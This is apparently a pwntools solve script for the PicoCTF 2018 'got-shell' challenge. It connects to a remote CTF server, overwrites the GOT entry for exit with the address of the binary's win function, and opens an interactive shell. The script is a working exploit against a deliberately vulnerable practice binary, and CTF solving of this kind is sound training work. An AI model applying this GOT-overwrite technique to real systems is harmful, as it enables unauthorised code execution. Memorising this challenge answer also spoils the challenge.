from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('PicoCTF_2018_got-shell')
io = remote('node4.buuoj.cn', 26545)
elf = ELF('PicoCTF_2018_got-shell')
exit_got = elf.got['exit']
win = elf.sym['win']

io.sendlineafter('Where would you like to write this 4 byte value?\n', hex(exit_got))
io.sendlineafter('Okay, now what value would you like to write to ' + hex(exit_got) + '\n', hex(win))
io.interactive()
